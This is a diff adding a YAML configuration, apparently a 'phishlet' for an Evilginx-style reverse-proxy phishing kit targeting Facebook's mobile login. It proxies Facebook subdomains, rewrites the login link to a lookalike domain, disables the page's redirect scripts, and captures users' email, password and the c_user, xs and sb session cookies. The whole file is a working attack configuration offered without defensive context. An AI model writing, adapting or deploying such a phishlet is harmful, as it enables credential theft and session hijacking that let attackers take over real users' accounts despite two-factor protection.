@@ -1,0 +1,46 @@
+name: 'facebook_mobile'
+author: 'custom'
+min_ver: '2.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'm', domain: 'facebook.com', session: true, is_landing: true}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'facebook.com', session: true, is_landing: false}
+  - {phish_sub: 'upload', orig_sub: 'upload', domain: 'facebook.com', session: true, is_landing: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: false}
+
+sub_filters:
+  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: 'https://www.facebook.com/login', replace: 'https://www.acount.support/login', mimes: ['text/html']}
+  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: 'window.location.replace', replace: '//window.location.replace', mimes: ['text/html']}
+  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: 'location.href', replace: '//location.href', mimes: ['text/html']}
+
+auth_tokens:
+  - domain: '.facebook.com'
+    keys: ['c_user', 'xs', 'sb']
+
+credentials:
+  username:
+    key: 'email'
+    search: '(email=)([^&]+)'
+    type: 'post'
+  password:
+    key: 'pass'
+    search: '(pass=)([^&]+)'
+    type: 'post'
+
+login:
+  domain: 'm.facebook.com'
+  path: '/login.php'
+
+force_post: true
+
+headers:
+  - domain: 'm.facebook.com'
+    headers:
+      User-Agent: 'Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36'
+      Accept-Language: 'en-US,en;q=0.9'
+      Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
+      Sec-Fetch-Site: 'none'
+      Sec-Fetch-Mode: 'navigate'
+      Sec-Fetch-User: '?1'
+      Upgrade-Insecure-Requests: '1'
+
